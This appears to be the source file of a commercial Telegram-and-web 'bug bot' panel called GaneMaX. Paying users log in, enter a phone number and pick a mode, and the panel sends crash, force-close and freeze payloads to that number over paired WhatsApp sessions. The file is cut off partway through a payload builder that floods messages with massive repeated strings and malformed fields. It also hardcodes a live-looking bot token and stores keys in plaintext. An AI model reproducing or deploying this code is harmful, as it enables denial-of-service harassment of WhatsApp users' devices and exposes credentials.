require('dotenv').config();
const { Telegraf } = require("telegraf");
const { Markup } = require('telegraf');
const fs = require('fs');
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const path = require("path");
const axios = require("axios");
const express = require('express');
const os = require('os');
const AdmZip = require('adm-zip');
const tar = require('tar');
const bodyParser = require('body-parser');
const cookieParser = require('cookie-parser');
const cors = require("cors");

const {
  default: makeWASocket,
  useMultiFileAuthState,
  DisconnectReason,
  fetchLatestWaWebVersion,
  generateWAMessageFromContent
} = require("@whiskeysockets/baileys");

// ==================== KONFIGURASI ==================== //
const BOT_TOKEN = process.env.BOT_TOKEN || "8308158315:AAFLlkqPnWvmEBzq11i1sZ7n3fTnaHMfM00";
const OWNER_ID = process.env.OWNER_ID || "1011991187";
const PORT = process.env.PORT || 2000;

const bot = new Telegraf(BOT_TOKEN);
const app = express();

// Middleware
app.use(cookieParser());
app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(cors());

// ==================== CEK FOLDER MAINFILE ==================== //
const MAINFILE_DIR = path.join(__dirname, 'MainFile');
if (!fs.existsSync(MAINFILE_DIR)) {
  console.log('📁 Creating MainFile folder...');
  fs.mkdirSync(MAINFILE_DIR, { recursive: true });
}

// CEK FILE HTML
const PUSAT_HTML = path.join(MAINFILE_DIR, 'Pusat.html');
const MBUT_HTML = path.join(MAINFILE_DIR, 'mbut.html');

if (!fs.existsSync(PUSAT_HTML)) {
  console.log('⚠️ Pusat.html not found, creating dummy...');
  fs.writeFileSync(PUSAT_HTML, `<!DOCTYPE html><html><head><title>Pusat</title></head><body><h1>Pusat.html</h1><p>Please upload the correct Pusat.html file.</p></body></html>`);
}

if (!fs.existsSync(MBUT_HTML)) {
  console.log('⚠️ mbut.html not found, creating dummy...');
  fs.writeFileSync(MBUT_HTML, `<!DOCTYPE html><html><head><title>Login</title></head><body><h1>Login Page</h1><p>Please upload the correct mbut.html file.</p></body></html>`);
}

// ==================== SUPABASE ==================== //
const { createClient } = require('@supabase/supabase-js');

const supabaseUrl = process.env.SUPABASE_URL;
const supabaseKey = process.env.SUPABASE_KEY;

console.log('🔍 Checking Supabase...');
console.log('  SUPABASE_URL:', supabaseUrl ? '✅ SET' : '❌ MISSING');
console.log('  SUPABASE_KEY:', supabaseKey ? '✅ SET' : '❌ MISSING');

if (!supabaseUrl || !supabaseKey) {
  console.error('❌ Supabase credentials missing!');
  process.exit(1);
}

const supabase = createClient(supabaseUrl, supabaseKey);
console.log('✅ Supabase connected!');

// ==================== QUERY FUNCTIONS (LANGSUNG DI SINI) ==================== //

async function getUsers() {
  const { data, error } = await supabase.from('users').select('*');
  if (error) throw error;
  return data || [];
}

async function getUserByUsername(username) {
  const { data, error } = await supabase.from('users').select('*').eq('username', username).single();
  if (error && error.code !== 'PGRST116') throw error;
  return data || null;
}

async function createUser(username, key, expired, role = 'user') {
  const { data, error } = await supabase.from('users').insert([{ username, key, expired, role }]).select().single();
  if (error) throw error;
  return data;
}

async function updateUser(username, updates) {
  const { data, error } = await supabase.from('users').update(updates).eq('username', username).select().single();
  if (error) throw error;
  return data;
}

async function deleteUser(username) {
  const { error } = await supabase.from('users').delete().eq('username', username);
  if (error) throw error;
  return true;
}

async function getAkses() {
  const { data, error } = await supabase.from('akses').select('*');
  if (error) throw error;
  const result = { owners: [], akses: [], resellers: [], pts: [], moderators: [] };
  data.forEach(item => {
    if (item.role === 'owner') result.owners.push(item.user_id);
    else if (item.role === 'akses') result.akses.push(item.user_id);
    else if (item.role === 'reseller') result.resellers.push(item.user_id);
    else if (item.role === 'pt') result.pts.push(item.user_id);
    else if (item.role === 'moderator') result.moderators.push(item.user_id);
  });
  return result;
}

async function addAkses(userId, role) {
  const { data, error } = await supabase.from('akses').insert([{ user_id: userId, role }]).select().single();
  if (error) throw error;
  return data;
}

async function removeAkses(userId, role) {
  const { error } = await supabase.from('akses').delete().eq('user_id', userId).eq('role', role);
  if (error) throw error;
  return true;
}

async function isOwner(userId) {
  const { data, error } = await supabase.from('akses').select('*').eq('user_id', userId).eq('role', 'owner').single();
  if (error && error.code !== 'PGRST116') throw error;
  return !!data;
}

async function isAuthorized(userId) {
  const { data, error } = await supabase.from('akses').select('*').eq('user_id', userId);
  if (error) throw error;
  return data && data.length > 0;
}

async function isReseller(userId) {
  const { data, error } = await supabase.from('akses').select('*').eq('user_id', userId).eq('role', 'reseller').single();
  if (error && error.code !== 'PGRST116') throw error;
  return !!data;
}

async function isPT(userId) {
  const { data, error } = await supabase.from('akses').select('*').eq('user_id', userId).eq('role', 'pt').single();
  if (error && error.code !== 'PGRST116') throw error;
  return !!data;
}

async function isModerator(userId) {
  const { data, error } = await supabase.from('akses').select('*').eq('user_id', userId).eq('role', 'moderator').single();
  if (error && error.code !== 'PGRST116') throw error;
  return !!data;
}

async function getActiveSessions() {
  const { data, error } = await supabase.from('sessions').select('bot_number').eq('is_active', true);
  if (error) throw error;
  return data.map(s => s.bot_number);
}

async function saveSession(botNumber, sessionData) {
  const { data, error } = await supabase.from('sessions').upsert({
    bot_number: botNumber,
    session_data: sessionData,
    is_active: true,
    updated_at: new Date()
  }, { onConflict: 'bot_number' }).select().single();
  if (error) throw error;
  return data;
}

async function deleteSession(botNumber) {
  const { error } = await supabase.from('sessions').update({ is_active: false }).eq('bot_number', botNumber);
  if (error) throw error;
  return true;
}

async function addHistory(username, activity, details = '') {
  const { data, error } = await supabase.from('history').insert([{ username, activity, details, timestamp: Date.now() }]).select().single();
  if (error) throw error;
  return data;
}

async function saveMessage(msgId, toUsername, fromId, senderName, content) {
  const { data, error } = await supabase.from('messages').insert([{
    msg_id: msgId,
    to_username: toUsername,
    from_id: fromId,
    sender_name: senderName,
    content,
    timestamp: Date.now(),
    read: false,
    replied: false
  }]).select().single();
  if (error) throw error;
  return data;
}

async function getMessagesForUser(username) {
  const { data, error } = await supabase.from('messages').select('*').eq('to_username', username).eq('replied', false).order('timestamp', { ascending: false });
  if (error) throw error;
  return data || [];
}

async function markMessageReplied(msgId) {
  const { error } = await supabase.from('messages').update({ replied: true }).eq('msg_id', msgId);
  if (error) throw error;
  return true;
}

// ==================== UTILITY FUNCTIONS ==================== //

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

function generateKey(length = 4) {
  const chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
  return Array.from({ length }, () => chars.charAt(Math.floor(Math.random() * chars.length))).join('');
}

function parseDuration(str) {
  const match = str.match(/^(\d+)([dh])$/);
  if (!match) return null;
  const value = parseInt(match[1]);
  const unit = match[2];
  return unit === "d" ? value * 86400000 : value * 3600000;
}

function getRuntime(seconds) {
  seconds = Number(seconds);
  var d = Math.floor(seconds / (3600 * 24));
  var h = Math.floor(seconds % (3600 * 24) / 3600);
  var m = Math.floor(seconds % 3600 / 60);
  var s = Math.floor(seconds % 60);
  return `${d}d ${h}h ${m}m ${s}s`;
}

function sessionPath(BotNumber) {
  const dir = path.join(process.env.RAILWAY_ENV ? '/tmp/auth' : './auth', `device${BotNumber}`);
  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
  return dir;
}

// ==================== SESSION FUNCTIONS ==================== //

async function saveActive(BotNumber) {
  const sessions = await getActiveSessions();
  if (!sessions.includes(BotNumber)) {
    await saveSession(BotNumber, {});
  }
}

async function delActive(BotNumber) {
  await deleteSession(BotNumber);
}

// ==================== INITIALIZE WA CONNECTIONS ==================== //

async function initializeWhatsAppConnections() {
  const activeSessions = await getActiveSessions();
  
  if (activeSessions.length === 0) {
    console.log(chalk.yellow('⚠️ Tidak ada session WA yang aktif.'));
    return;
  }

  console.log(chalk.blue(`
╔════════════════════════════╗
║      SESSÕES ATIVAS DO WA
╠════════════════════════════╣
║  QUANTIDADE : ${activeSessions.length}
╚════════════════════════════╝`));

  for (const BotNumber of activeSessions) {
    console.log(chalk.green(`Menghubungkan: ${BotNumber}`));
    const sessionDir = sessionPath(BotNumber);
    
    if (!fs.existsSync(sessionDir)) {
      console.log(chalk.red(`❌ Folder session untuk ${BotNumber} tidak ditemukan!`));
      await delActive(BotNumber);
      continue;
    }

    try {
      const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
      const { version } = await fetchLatestWaWebVersion();

      const waSock = makeWASocket({
        auth: state,
        printQRInTerminal: false,
        logger: pino({ level: "silent" }),
        version: version,
        defaultQueryTimeoutMs: undefined,
      });

      waSock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
        if (connection === "open") {
          console.log(chalk.green(`✅ ${BotNumber} terhubung!`));
          sessions.set(BotNumber, waSock);
          if (sessions.size === 1) sock = waSock;
        }

        if (connection === "close") {
          const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
          if (shouldReconnect) {
            console.log(chalk.yellow(`🔄 ${BotNumber} reconnect...`));
          } else {
            console.log(chalk.red(`❌ ${BotNumber} logged out.`));
            sessions.delete(BotNumber);
            await delActive(BotNumber);
          }
        }
      });

      waSock.ev.on("creds.update", saveCreds);
      sessions.set(BotNumber, waSock);
      if (sessions.size === 1) sock = waSock;

    } catch (err) {
      console.log(chalk.red(`❌ Gagal connect ${BotNumber}: ${err.message}`));
    }
  }
}

// ==================== WHATSAPP CONNECTION ==================== //

async function connectToWhatsApp(BotNumber, chatId, ctx) {
  const sessionDir = sessionPath(BotNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  let statusMessage = await ctx.reply(`Pareando com o número ${BotNumber}...`, { parse_mode: "HTML" });

  const editStatus = async (text) => {
    try {
      await ctx.telegram.editMessageText(chatId, statusMessage.message_id, null, text, { parse_mode: "HTML" });
    } catch (e) {
      console.error("Falha ao editar mensagem:", e.message);
    }
  };

  const { version } = await fetchLatestWaWebVersion();

  const waSock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: pino({ level: "silent" }),
    version: version,
    defaultQueryTimeoutMs: undefined,
  });

  let isConnected = false;

  waSock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
    if (connection === "close") {
      const code = lastDisconnect?.error?.output?.statusCode;
      if (code >= 500 && code < 600) {
        await editStatus(`Reconectando...`);
        return await connectToWhatsApp(BotNumber, chatId, ctx);
      }
      if (!isConnected) {
        await editStatus(`✗ Falha na conexão.`);
      }
    }

    if (connection === "open") {
      isConnected = true;
      sessions.set(BotNumber, waSock);
      if (sessions.size === 1) sock = waSock;
      await saveActive(BotNumber);
      await editStatus(`✓ Conectado com sucesso.`);
    }

    if (connection === "connecting") {
      await new Promise(r => setTimeout(r, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await waSock.requestPairingCode(BotNumber, "DEVILBOS");
          const formatted = code.match(/.{1,4}/g)?.join("-") || code;
          await ctx.telegram.editMessageText(chatId, statusMessage.message_id, null,
            `╔════════════════════════════╗\n║   STATUS PAIR               ║\n╠════════════════════════════╣\n║  Numero : ${BotNumber}\n║  Codigo : ${formatted}\n╚════════════════════════════╝`,
            { parse_mode: "HTML" }
          );
        }
      } catch (err) {
        console.error("Erro ao solicitar código:", err);
        await editStatus(`❗ ${err.message}`);
      }
    }
  });

  waSock.ev.on("creds.update", saveCreds);
  return waSock;
}

// ==================== VARIABEL GLOBAL ==================== //
const sessions = new Map();
let sock = null;

// ==================== TELEGRAM COMMANDS ==================== //

// --- START ---
bot.command("start", async (ctx) => {
  const loadingMsg = await ctx.reply('<blockquote>📡 Sabar Bree Sedang Menyiapkan Menu Page</blockquote>', { parse_mode: 'HTML' });
  await new Promise(resolve => setTimeout(resolve, 2000));
  await ctx.telegram.deleteMessage(ctx.chat.id, loadingMsg.message_id).catch(() => {});

  const username = ctx.from.username ? `@${ctx.from.username}` : ctx.from.first_name;
  const runtime = getRuntime(process.uptime());

  const textMain = `
<blockquote>💢 GaneMaX Core ☇ Control\nWhere Are To ${username}, To Bot Control Apps GaneMaX Version 3.4.1 Beta</blockquote>
━━━━━━━━━━━━━━━
<blockquote>App Information</blockquote>
メ NameBot : @${ctx.botInfo.username}
メ NameApps : GaneMaX
メ Version : 3.4.1 Beta
メ CreateBase : @XangelXy
メ Server : Online⚡
メ Runtime : ${runtime}
━━━━━━━━━━━━━━━
<blockquote>☇ Silahkan Pilih Menu Dibawah Ya Bree</blockquote>
`;

  const keyboardMain = Markup.inlineKeyboard([
    [Markup.button.callback('Control ϟ Menu', 'menu_control'), Markup.button.callback('Settings ϟ Account', 'menu_account')],
    [Markup.button.callback('Owner ϟ Access', 'menu_owner'), Markup.button.url('Developer ϟ Apps', 'https://t.me/XangelXy')]
  ]);

  await ctx.replyWithPhoto(
    { url: "https://files.catbox.moe/em3c88.jpg" },
    { caption: textMain, parse_mode: "HTML", ...keyboardMain }
  );

  await ctx.replyWithAudio(
    { url: "https://files.catbox.moe/mdoxtb.mp3" },
    { caption: "Welcome To Bot Apps", parse_mode: "HTML", performer: "GaneMaX System", title: "System Booting Sound" }
  );
});

// --- MENU ACTIONS ---
bot.action('menu_control', async (ctx) => {
  const username = ctx.from.username ? `@${ctx.from.username}` : ctx.from.first_name;
  const runtime = getRuntime(process.uptime());
  const textControl = `
<blockquote>💢 GaneMaX Core ☇ Control\nWhere Are To ${username}</blockquote>
━━━━━━━━━━━━━━━
<blockquote>Control The Apps</blockquote>
/Pairing ⎧ Number Sender ⎭
/listsender ⎧ Cek Sender Actived ⎭
`;
  const keyboardControl = Markup.inlineKeyboard([
    [Markup.button.callback('! Back To Home', 'back_home')]
  ]);
  await ctx.editMessageCaption(textControl, { parse_mode: 'HTML', ...keyboardControl }).catch(() => {});
});

bot.action('menu_account', async (ctx) => {
  const username = ctx.from.username ? `@${ctx.from.username}` : ctx.from.first_name;
  const runtime = getRuntime(process.uptime());
  const textAccount = `
<blockquote>💢 GaneMaX Core ☇ Control\nWhere Are To ${username}</blockquote>
━━━━━━━━━━━━━━━
<blockquote>🛡️ Account Control</blockquote>
/CreateAccount ⎧ Create New Account ⎭
/listakun ⎧ Cek Daftar Akun ⎭
`;
  const keyboardAccount = Markup.inlineKeyboard([
    [Markup.button.callback('! Back To Home', 'back_home')]
  ]);
  await ctx.editMessageCaption(textAccount, { parse_mode: 'HTML', ...keyboardAccount }).catch(() => {});
});

bot.action('menu_owner', async (ctx) => {
  const textOwner = `
<blockquote>💢 GaneMaX Core ☇ Control</blockquote>
<b>AKSES HANYA DIBERIKAN KEPADA XANGEL</b>
`;
  const keyboardOwner = Markup.inlineKeyboard([
    [Markup.button.callback('! Back To Home', 'back_home')]
  ]);
  await ctx.editMessageCaption(textOwner, { parse_mode: 'HTML', ...keyboardOwner }).catch(() => {});
});

bot.action('back_home', async (ctx) => {
  const username = ctx.from.username ? `@${ctx.from.username}` : ctx.from.first_name;
  const runtime = getRuntime(process.uptime());
  const textMain = `
<blockquote>💢 GaneMaX Core ☇ Control\nWhere Are To ${username}</blockquote>
━━━━━━━━━━━━━━━
<blockquote>☇ Silahkan Pilih Menu Dibawah Ya Bree</blockquote>
`;
  const keyboardMain = Markup.inlineKeyboard([
    [Markup.button.callback('Control ϟ Menu', 'menu_control'), Markup.button.callback('Settings ϟ Account', 'menu_account')],
    [Markup.button.callback('Owner ϟ Access', 'menu_owner'), Markup.button.url('Developer ϟ Apps', 'https://t.me/XangelXy')]
  ]);
  await ctx.editMessageCaption(textMain, { parse_mode: 'HTML', ...keyboardMain }).catch(() => {});
});

// --- PAIRING ---
bot.command("Pairing", async (ctx) => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return ctx.reply("✗ Falha\n\nExample : /addbot 628xxxx", { parse_mode: "HTML" });
  }
  const BotNumber = args[1];
  await connectToWhatsApp(BotNumber, ctx.chat.id, ctx);
});

// --- LIST SENDER ---
bot.command("listsender", async (ctx) => {
  const activeSessions = await getActiveSessions();
  if (activeSessions.length === 0) return ctx.reply("Gak ada sender wlee");
  const daftarSender = activeSessions.map(n => `• ${n}`).join("\n");
  ctx.reply(`Daftar Sender Aktif:\n${daftarSender}`);
});

// --- DELETE SESSION ---
bot.command("delsesi", async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1);
  const BotNumber = args[0];
  if (!BotNumber) return ctx.reply("❌ Gunakan format:\n/delsesi <nomor>");

  try {
    await delActive(BotNumber);
    const dir = sessionPath(BotNumber);
    if (fs.existsSync(dir)) {
      fs.rmSync(dir, { recursive: true, force: true });
    }
    await ctx.reply(`Sesi untuk nomor *${BotNumber}* berhasil dihapus.`, { parse_mode: "Markdown" });
  } catch (err) {
    console.error("Gagal hapus sesi:", err);
    await ctx.reply(`❌ Gagal hapus sesi untuk nomor *${BotNumber}*.\nError: ${err.message}`, { parse_mode: "Markdown" });
  }
});

// --- DELETE BOT ---
bot.command("delbot", async (ctx) => {
  const userId = ctx.from.id.toString();
  const args = ctx.message.text.split(" ");
  
  const isUserAuthorized = await isAuthorized(userId);
  if (!isUserAuthorized) {
    return ctx.reply("[ ! ] - ACESSO SOMENTE PARA USUÁRIOS\n—Por favor, registre-se primeiro para acessar este recurso.");
  }
  
  if (args.length < 2) return ctx.reply("✗ Falha\n\nExample : /delsender 628xxxx", { parse_mode: "HTML" });

  const number = args[1];
  if (!sessions.has(number)) return ctx.reply("Sender tidak ditemukan.");

  try {
    const sessionDir = sessionPath(number);
    sessions.get(number).end();
    sessions.delete(number);
    fs.rmSync(sessionDir, { recursive: true, force: true });
    await delActive(number);
    ctx.reply(`✓ Session untuk bot ${number} berhasil dihapus.`);
  } catch (err) {
    console.error(err);
    ctx.reply("Terjadi error saat menghapus sender.");
  }
});

// --- CREATE ACCOUNT (Telegram) ---
bot.command("CreateAccount", async (ctx) => {
  const userId = ctx.from.id.toString();
  const args = ctx.message.text.split(" ")[1];

  const isUserAuthorized = await isAuthorized(userId);
  if (!isUserAuthorized) {
    return ctx.reply("😹—Lu siapa tolol, Buy Account Only @xangelxy");
  }

  if (!args || !args.includes(",")) {
    return ctx.reply(
      "<blockquote> Tutorial Cara Create Account</blockquote>\n" +
      "1. Ketik /addakun\n" +
      "2. Format: username,durasi,role,customKey\n" +
      "3. Contoh: /CreateAccount Keiraa,30d,owner,Stecu",
      { parse_mode: "HTML" }
    );
  }

  const parts = args.split(",");
  const username = parts[0].trim();
  const durasiStr = parts[1].trim();
  const roleInput = parts[2] ? parts[2].trim().toLowerCase() : "user";
  const customKey = parts[3] ? parts[3].trim() : null;

  const durationMs = parseDuration(durasiStr);
  if (!durationMs) return ctx.reply("✗ Format durasi salah!");

  const existingUser = await getUserByUsername(username);
  if (existingUser) return ctx.reply(`⚠️ Username ${username} sudah ada!`);

  const key = customKey || generateKey(4);
  const expired = Date.now() + durationMs;

  await createUser(username, key, expired, roleInput);

  const expiredStr = new Date(expired).toLocaleString("id-ID", {
    year: "numeric", month: "2-digit", day: "2-digit", hour: "2-digit", minute: "2-digit",
    timeZone: "Asia/Jakarta"
  });

  await ctx.reply(
    `<blockquote>⚙️ Account Succesfull Create </blockquote>\n` +
    `<b>📢 System Sudah Membuat Akun Untuk anda Harap Login Ke akun Anda, Jika Ada Masalah? Hubungi @XangelXy</b>\n\n` +
    `<blockquote>📊 DATA ACCOUNT !!</blockquote>\n` +
    `<b>👤Username:</b> ${username}\n` +
    `<b>🏷️Role:</b> ${roleInput.toUpperCase()}\n` +
    `<b>🛡️Password:</b> <code>${key}</code>\n` +
    `<b>⌛Berlaku:</b> <b>${expiredStr}</b> WIB`,
    { parse_mode: "HTML" }
  );
});

// --- LIST AKUN (Telegram) ---
bot.command("listakun", async (ctx) => {
  const userId = ctx.from.id.toString();
  
  const isUserOwner = await isOwner(userId);
  if (!isUserOwner) {
    return ctx.reply("⛔ <b>Akses Ditolak!</b>\nFitur ini khusus Owner.", { parse_mode: "HTML" });
  }

  const users = await getUsers();
  if (users.length === 0) return ctx.reply("💢 Belum ada akun yang dibuat.");

  let teks = `<blockquote>☘️ All Account Apps GaneMaX</blockquote>\n\n`;

  users.forEach((u, i) => {
    const userRole = u.role ? u.role.toLowerCase() : "user";
    let roleDisplay = "USER";
    let roleIcon = "👤";

    switch (userRole) {
      case "owner": case "creator": roleDisplay = "OWNER"; roleIcon = "👑"; break;
      case "admin": roleDisplay = "ADMIN"; roleIcon = "👮"; break;
      case "reseller": roleDisplay = "RESELLER"; roleIcon = "💼"; break;
      case "moderator": roleDisplay = "MODERATOR"; roleIcon = "🛡️"; break;
      case "vip": roleDisplay = "VIP MEMBER"; roleIcon = "💎"; break;
      case "pt": roleDisplay = "PARTNER"; roleIcon = "🤝"; break;
      default: roleDisplay = "USER"; roleIcon = "👤"; break;
    }

    const rawKey = u.key ? u.key.toString() : "???";
    let maskedKey = "";
    if (rawKey === "???") {
      maskedKey = "-(Rusak/No Key)-";
    } else if (rawKey.length <= 5) {
      maskedKey = "•".repeat(rawKey.length);
    } else {
      const start = rawKey.slice(0, 2);
      const end = rawKey.slice(-2);
      maskedKey = `${start}•••••${end}`;
    }

    const exp = new Date(u.expired).toLocaleString("id-ID", {
      year: "numeric", month: "2-digit", day: "2-digit",
      hour: "2-digit", minute: "2-digit",
      timeZone: "Asia/Jakarta"
    });

    teks += `<b>${i + 1}. ${u.username}</b> [ ${roleIcon} ${roleDisplay} ]\n`;
    teks += `   🔑 Key: <code>${maskedKey}</code>\n`;
    teks += `   ⌛ Exp: ${exp} WIB\n\n`;
  });

  await ctx.reply(teks, { parse_mode: "HTML" });
});

// --- DELETE AKUN (Telegram) ---
bot.command("delakun", async (ctx) => {
  const userId = ctx.from.id.toString();
  const username = ctx.message.text.split(" ")[1];
  
  const isUserAuthorized = await isAuthorized(userId);
  if (!isUserAuthorized) {
    return ctx.reply("[ ! ] - ACESSO SOMENTE PARA USUÁRIOS");
  }
  
  if (!username) return ctx.reply("❗Enter username!\nExample: /delkey taitan");

  const user = await getUserByUsername(username);
  if (!user) return ctx.reply(`✗ Username \`${username}\` not found.`, { parse_mode: "HTML" });

  await deleteUser(username);
  ctx.reply(`✓ Key belonging to ${username} was successfully deleted.`, { parse_mode: "HTML" });
});

// ==================== WEB SERVER ==================== //

app.get("/", (req, res) => {
  const filePath = path.join(__dirname, "MainFile", "mbut.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("✗ Gagal baca mbut.html");
    res.send(html);
  });
});

app.get("/login", (req, res) => {
  const msg = req.query.msg || "";
  const filePath = path.join(__dirname, "MainFile", "mbut.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) return res.status(500).send("✗ Gagal baca file mbut.html");
    res.send(html);
  });
});

// --- AUTH LOGIN ---
app.post("/auth", async (req, res) => {
  const { username, key } = req.body;
  const user = await getUserByUsername(username);

  if (!user || user.key !== key) {
    return res.redirect("/login?msg=Username/Password Salah");
  }

  res.cookie("sessionUser", user.username, {
    maxAge: 86400000,
    httpOnly: true
  });

  res.redirect("/execution");
});

// --- EXECUTION / DASHBOARD ---
let lastExecution = 0;

app.get("/execution", async (req, res) => {
  const username = req.cookies.sessionUser;
  if (!username) return res.redirect('/login');

  const currentUser = await getUserByUsername(username);
  if (!currentUser) return res.redirect('/login');

  const targetNumber = req.query.target;
  const mode = req.query.mode;

  // ========== EKSEKUSI SERANGAN ========== //
  if (targetNumber || mode) {
    if (!sock) {
      return res.send(executionPage("❌ NO WA SESSION", { message: "Tidak ada koneksi WhatsApp aktif!" }, false, currentUser, currentUser.key, mode));
    }

    if (!targetNumber) {
      return res.send(executionPage("✓ Server ON", { message: "Masukkan nomor & mode." }, true, currentUser, currentUser.key, mode || ""));
    }

    const now = Date.now();
    const cooldown = 3 * 60 * 1000;
    if (typeof lastExecution !== 'undefined' && (now - lastExecution < cooldown)) {
      const sisa = Math.ceil((cooldown - (now - lastExecution)) / 1000);
      return res.send(executionPage("⏳ SERVER COOLDOWN", { message: `Tunggu ${sisa} detik.` }, false, currentUser, currentUser.key, ""));
    }

    const target = `${targetNumber}@s.whatsapp.net`;

    try {
      if (mode === "uisystem") Crashandroid(24, target);
      else if (mode === "invis") DelayBapakLo(24, target);
      else if (mode === "fc") Forclose(24, target);
      else if (mode === "ulti") BomBug(24, target);
      else if (mode === "kira") StuckHome(24, target);
      else if (mode === "ganemax") GaneMaXCrashEngine(24, target);
      else throw new Error("Mode tidak dikenal.");

      lastExecution = now;
      console.log(`[SUCCESS] Attack sent to ${targetNumber}`);

      return res.send(executionPage("✓ S U C C E S", {
        target: targetNumber,
        timestamp: new Date().toLocaleString("id-ID"),
        message: `𝐄𝐱𝐞𝐜𝐮𝐭𝐞 𝐌𝐨𝐝𝐞: ${mode.toUpperCase()}`
      }, false, currentUser, currentUser.key, mode));

    } catch (err) {
      console.error(err);
      return res.send(executionPage("✗ Gagal", { target: targetNumber, message: "Error Server" }, false, currentUser, currentUser.key, mode));
    }
  }

  // ========== DASHBOARD ========== //
  const filePath = path.join(__dirname, "MainFile", "Pusat.html");
  fs.readFile(filePath, "utf8", (err, html) => {
    if (err) {
      console.error("❌ Gagal baca file HTML:", err);
      return res.status(500).send("Error loading HTML file");
    }

    const rawRole = (currentUser.role || 'user').toLowerCase();
    let roleHtml = "";

    switch (rawRole) {
      case "owner": case "creator": roleHtml = '<span style="color: #FFFFFF; text-shadow: 0px 0px 6px #FFFFFF;">Owner</span>'; break;
      case "admin": roleHtml = '<span style="color: #FFFFFF; text-shadow: 0px 0px 4px #FFFFFF;">Admin</span>'; break;
      case "reseller": roleHtml = '<span style="color: #FFFFFF; text-shadow: 0px 0px 4px #FFFFFF;">Reseller</span>'; break;
      case "pt": roleHtml = '<span style="color: #FFFFFF;">Partner</span>'; break;
      case "vip": roleHtml = '<span style="color: #FFFFFF;">VIP</span>'; break;
      case "moderator": roleHtml = '<span style="color: #FFFFFF;">Moderator</span>'; break;
      default: roleHtml = '<span style="color: #FFFFFF;">Member</span>'; break;
    }

    const timeIso = currentUser.expired ? new Date(currentUser.expired).toISOString() : new Date().toISOString();

    html = html
      .replace(/\$\{username\}/g, currentUser.username)
      .replace(/\$\{displayRole\}/g, roleHtml)
      .replace(/\$\{formattedTime\}/g, timeIso)
      .replace(/\$\{rawRole\}/g, rawRole)
      .replace(/\$\{userKey\}/g, currentUser.key || "")
      .replace(/\$\{password\}/g, currentUser.key || "")
      .replace(/\$\{key\}/g, currentUser.key || "");

    res.send(html);
  });
});

// ==================== API ENDPOINTS ==================== //

app.post('/api/create-account', async (req, res) => {
  const { username, customKey, duration, role } = req.body;
  const adminUsername = req.cookies.sessionUser;

  if (!adminUsername) return res.json({ success: false, message: "Sesi Habis, Login Ulang!" });

  const adminUser = await getUserByUsername(adminUsername);
  if (!adminUser) return res.json({ success: false, message: "Admin tidak ditemukan!" });

  const adminRole = (adminUser.role || 'user').toLowerCase();
  const targetRole = role.toLowerCase();
  let allowed = false;

  if (adminRole === 'owner' || adminRole === 'creator') allowed = true;
  else if (adminRole === 'admin' && ['member', 'user', 'reseller', 'pt', 'admin'].includes(targetRole)) allowed = true;
  else if (adminRole === 'pt' && ['member', 'user', 'reseller', 'pt'].includes(targetRole)) allowed = true;
  else if ((adminRole === 'reseller' || adminRole === 'moderator') && ['member', 'user', 'reseller'].includes(targetRole)) allowed = true;

  if (!allowed) return res.json({ success: false, message: `Role ${adminRole} tidak boleh membuat ${targetRole}!` });

  const existingUser = await getUserByUsername(username);
  if (existingUser) return res.json({ success: false, message: "Username sudah ada!" });

  let ms = 30 * 24 * 60 * 60 * 1000;
  if (duration.endsWith('d')) ms = parseInt(duration) * 24 * 60 * 60 * 1000;
  else if (duration.endsWith('h')) ms = parseInt(duration) * 60 * 60 * 1000;

  const finalKey = customKey || generateKey(4);
  const expired = Date.now() + ms;

  await createUser(username, finalKey, expired, targetRole);

  console.log(`\n================================`);
  console.log(`[+] NEW ACCOUNT CREATED (WEB)`);
  console.log(` ├─ Creator : ${adminUsername} (${adminRole})`);
  console.log(` ├─ New User: ${username}`);
  console.log(` ├─ Role    : ${targetRole.toUpperCase()}`);
  console.log(` └─ Expired : ${new Date(expired).toLocaleString()}`);
  console.log(`================================\n`);

  return res.json({ success: true, message: "Berhasil" });
});

app.get('/api/list-accounts', async (req, res) => {
  if (!req.cookies.sessionUser) return res.json([]);
  const users = await getUsers();
  const safeList = users.map(u => ({
    username: u.username,
    role: u.role || 'user',
    expired: u.expired
  })).reverse();
  res.json(safeList);
});

app.post('/api/logout', (req, res) => {
  const { reason } = req.body;
  const username = req.cookies.sessionUser || "Unknown";
  console.log(`[LOGOUT] User: ${username} | Alasan: ${reason}`);
  res.clearCookie('sessionUser');
  return res.json({ success: true });
});

// ==================== ATTACK FUNCTIONS (SEMUA ADA DISINI) ==================== //

// --- OverloadingCrash ---
async function OverloadingCrash(sock, target) {
  try {
    const rge = (t, c) => t.repeat(c);
    const payloads = [];

    payloads.push({ text: rge("A", 100000) + rge("B", 100000) + rge("C", 100000) });

    payloads.push({
      viewOnceMessage: {
        message: {
          listResponseMessage: {
            title: rge("◼️", 50000),
            description: "👀",
            listType: 1,
            singleSelectReply: { selectedRowId: rge("🚨", 20000) },
            contextInfo: { forwardingScore: 999, isForwarded: true }
          },
          conversation: rge("A", 30000),
          extendedTextMessage: { text: rge("B", 30000) }
        }
      }
    });

    payloads.push({
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/sample",
                mimetype: rge("C", 10000),
                fileName: rge("🚨", 5000),
                fileLength: "9999999999",
                jpegThumbnail: null
              },
              title: rge("D", 10000)
            },
            body: { text: "Ewe Ewe Ah Ah Crot" + rge("E", 20000) },
            nativeFlowMessage: {
              messageParamsJson: "{}",
              buttons: [
                { name: "button_one", buttonParamsJson: JSON.stringify({ display_text: rge("F", 500) }) },
